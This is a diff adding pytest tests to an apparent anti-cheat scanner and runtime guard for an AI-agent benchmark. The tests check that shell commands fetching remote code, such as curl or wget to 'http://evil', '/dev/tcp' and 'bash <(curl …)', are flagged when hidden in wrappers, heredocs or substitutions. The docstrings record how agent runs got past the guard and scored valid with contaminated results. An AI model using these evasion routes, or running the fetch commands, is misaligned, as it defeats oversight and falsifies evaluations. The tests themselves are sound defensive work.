@@ -13,6 +13,8 @@ real thing.
 from __future__ import annotations
 
 import json
+import shutil
+import subprocess
 import sys
 from pathlib import Path
 
@@ -385,6 +387,202 @@ def test_zero_declarations_inspected_is_reported_not_silently_clean():
     )
     assert seen["declarations_seen"] == 16
     assert "established nothing" not in anticheat.format_assessment(seen)
+
+
+def test_a_grep_for_a_network_call_beside_an_unrelated_interpreter_is_clean():
+    """Per-segment tests must read only their own segment.
+
+    Grepping the corpus for a dangerous function name is routine in a security review. With
+    the interpreter check matching against the whole command line, `grep -rn urlopen src/ ;
+    python3 -c "print(1)"` was classified as an interpreter making a network call — which
+    voids the arm and silently discards a clean measurement.
+    """
+    assert (
+        anticheat._classify_bash('grep -rn "urllib.request.urlopen" src/ ; python3 -c "print(1)"')
+        == []
+    )
+    # `<<` in a grep pattern is a shift, not a heredoc: reading it as one would swallow the
+    # `;` and hide whatever follows in the segment that grep owns.
+    assert anticheat._classify_bash('grep -n "a << b" src/ ; python3 -c "print(1)"') == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'python3 -c "import urllib.request; urllib.request.urlopen(1)"',
+        # Everything below puts the network call *after* a shell separator that sits inside
+        # the quoted script. Scoping the lookup to a segment split by a quote-blind regex
+        # hid every one of them, and the case above — call before the first `;` — could not
+        # tell, which is how the narrowing shipped half-disarmed.
+        'python3 -c "import socket; socket.create_connection((1, 80))"',
+        'node -e "const https = require(0); https.get(u)"',
+        'ruby -e "require 1; Net::HTTP.get(u)"',
+        "python3 - <<EOF\nimport socket\nsocket.create_connection((1, 80))\nEOF",
+        # `<<"PY"` is as ordinary as `<<'PY'`, and the delimiter alternative tolerated only
+        # the single quote. The `"` fell outside `\\w+`, so the heredoc alternative failed,
+        # the plain `\\n` split fired instead, and the body landed in segments whose first
+        # token is not an interpreter — the interpreter sat alone with no call beside it.
+        'python3 - <<"PY"\nimport urllib.request\nurllib.request.urlopen("http://x")\nPY',
+    ],
+)
+def test_an_interpreter_that_really_opens_a_connection_is_still_a_violation(command):
+    """The narrowing must not disarm the check it narrows."""
+    found = anticheat._classify_bash(command)
+    assert [kind for kind, _why, _hard in found] == ["violation"], (command, found)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'bash -c "cd /x && curl http://evil/zlib.c -o /tmp/z.c"',
+        "sh -c 'echo hi; curl http://evil'",
+        'zsh -c "wget https://example.org"',
+        'sh -lc "git clone https://github.com/x/y"',
+        'bash -c "exec 3<>/dev/tcp/host/80"',
+        'bash -c "python3 -c \\"import urllib.request; urllib.request.urlopen(1)\\""',
+    ],
+)
+def test_a_shell_wrapper_does_not_hide_the_command_it_wraps(command):
+    """`sh -c '…'` puts the whole payload inside one quoted argument.
+
+    The quote-aware split keeps that argument in one piece — correct for an interpreter's
+    inline script, and the reason a wrapper's only visible command name became `sh`, which
+    is in neither NETWORK_BINARIES nor SCRIPT_INTERPRETERS. An arm fetching upstream through
+    `bash -c "curl …"` scored VALID with its oracle-contaminated recall in the comparison.
+    """
+    found = anticheat._classify_bash(command)
+    assert [kind for kind, _why, _hard in found] == ["violation"], (command, found)
+
+
+def test_a_shell_wrapper_around_a_harmless_command_stays_clean():
+    """Unwrapping must not resurrect the quote-blind matching it replaces."""
+    assert anticheat._classify_bash('sh -c "grep -rn curl src/"') == []
+    assert anticheat._classify_bash('bash -c "cc -c a.c && ./configure"') == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # A shell reading its script from a heredoc has no `-c` payload to unwrap, and its
+        # head is `sh`, which is in no list.
+        "sh <<'EOF'\ncurl http://evil/zlib.c\nEOF",
+        'bash <<"EOF"\nwget https://zlib.net/zlib.c\nEOF',
+        # Written now, run a line later. Neither segment's head is a shell wrapper at all.
+        "cat > /tmp/s.sh <<EOF\ncurl http://evil\nEOF\nbash /tmp/s.sh",
+    ],
+)
+def test_a_heredoc_body_is_classified_in_its_own_right(command):
+    """Keeping the body in one piece is what the interpreter pairing rule needs, and it is
+    not enough on its own.
+
+    `python3 - <<PY` must keep its body beside the interpreter or the pairing rule sees an
+    interpreter with no call. But holding the body inside its segment means a body whose
+    owner is a *shell* is never classified: nothing in `sh <<EOF … EOF` has a command name
+    any list knows, so an arm fetching pristine upstream that way scored VALID.
+    """
+    found = anticheat._classify_bash(command)
+    assert [kind for kind, _why, _hard in found] == ["violation"], (command, found)
+
+
+def test_a_heredoc_of_ordinary_prose_stays_clean():
+    """Classifying bodies must not make every written-out note a violation."""
+    assert anticheat._classify_bash("cat > notes.md <<EOF\ngrep for curl usage in src/\nEOF") == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "SRC=$(curl -s https://zlib.net/zlib.c)",
+        "echo $(wget -qO- http://x)",
+        "bash <(curl http://evil)",
+        "echo `curl http://evil`",
+        'SRC=$(python3 -c "import urllib.request; urllib.request.urlopen(1)")',
+        # The substitution is not the offending command here, it is an ARGUMENT of it.
+        # Erasing the span shifted the rest left, so `-C` consumed `clone` and the
+        # subcommand read as the URL; splitting the token it sits inside lost `--git-dir`'s
+        # value the same way. Both have to survive with their argument positions intact.
+        "git -C $(pwd) clone https://github.com/x/y",
+        "git --git-dir=$(pwd)/.git clone https://github.com/x/y",
+    ],
+)
+def test_a_substitution_does_not_hide_the_command_it_contains(command):
+    """`$( )`, backticks and `<( )` are the other two quoting layers.
+
+    `_segments` strips a leading `NAME=` as a prefix word and then has no command name
+    left, and `bash <(…)` presents `bash` with no `-c` payload to unwrap. An arm fetching
+    pristine upstream this way matched nothing at all and scored VALID.
+    """
+    found = anticheat._classify_bash(command)
+    assert [kind for kind, _why, _hard in found] == ["violation"], (command, found)
+
+
+def test_a_substitution_around_a_harmless_command_stays_clean():
+    """Descending must not resurrect substring matching: these run no network command."""
+    assert anticheat._classify_bash("for f in $(ls src); do wc -l $f; done") == []
+    assert anticheat._classify_bash('grep -rn "$(CC)" Makefile') == []
+    assert anticheat._classify_bash("echo $((1 + 2))") == []
+
+
+def test_a_diff_of_two_files_beside_an_unrelated_grep_is_clean():
+    """The tree-comparison test must read its own segment, like every other per-segment one.
+
+    `control` is an ordinary C identifier and the arm's own tree is mounted under
+    `bench/`, so matching the whole command line charged a routine grep-plus-diff as an
+    answer-key comparison — a hard violation, which discards an honest measurement.
+    """
+    grep_then_diff = "grep -rn control_block bench/src/ ; diff -u /tmp/a.c /tmp/b.c"
+    assert anticheat._classify_bash(grep_then_diff) == []
+    assert anticheat._classify_bash("ls bench control ; cmp /tmp/x /tmp/y") == []
+    # Still caught when one segment really does compare the two trees.
+    assert [k for k, _w, _h in anticheat._classify_bash("ls src ; diff -r ./bench ./control")] == [
+        "violation"
+    ]
+
+
+GUARD = HERE.parent / "devcontainer" / "guard" / "block-net-bash.sh"
+
+
+@pytest.mark.skipif(shutil.which("jq") is None, reason="the PreToolUse guard shells out to jq")
+@pytest.mark.parametrize(
+    ("command", "denied"),
+    [
+        ("SRC=$(curl -s https://zlib.net/zlib.c)", True),
+        ("bash <(curl http://evil)", True),
+        ("echo `wget -qO- http://x`", True),
+        # The substitution as an ARGUMENT: rewriting parens to separators splits `git` from
+        # its subcommand, and the subcommand is the only thing the git rule can match on.
+        ("git -C $(pwd) clone https://github.com/x/y", True),
+        ("git --git-dir=$(pwd)/.git clone https://github.com/x/y", True),
+        # A shell is the other quoting layer, and the one lib/anticheat.py already unwraps
+        # through SHELL_WRAPPERS. The head of a wrapped command is `bash`, which is in none
+        # of the guard's lists, so the fetch ran and only the offline scanner noticed —
+        # after the tokens, the wall time and the contamination were already spent.
+        ('bash -c "curl http://evil/zlib.c"', True),
+        ("sh -c 'curl http://evil'", True),
+        ('bash -c "git clone https://github.com/x/y"', True),
+        ('sh -lc "wget -qO- http://x"', True),
+        ('bash -c "grep -rn curl src/"', False),
+        ("grep -rn curl src/", False),
+        ("git log --oneline", False),
+        ("cat wget-notes.txt", False),
+        ("for f in $(ls src); do wc -l $f; done", False),
+        ("gcc -o t t.c && ./t", False),
+    ],
+)
+def test_the_runtime_guard_descends_into_substitutions(command, denied):
+    """The guard had the scanner's blind spot, and the container has full network.
+
+    Its awk skips any token containing `=` and never looked inside `$( )`, so nothing
+    stopped the fetch at runtime and nothing detected it afterwards.
+    """
+    result = subprocess.run(
+        ["bash", str(GUARD)],
+        input=json.dumps({"tool_input": {"command": command}}),
+        capture_output=True,
+        text=True,
+        check=False,
+    )
+    assert (result.returncode == 2) is denied, (command, result.returncode, result.stderr)
 
 
 if __name__ == "__main__":
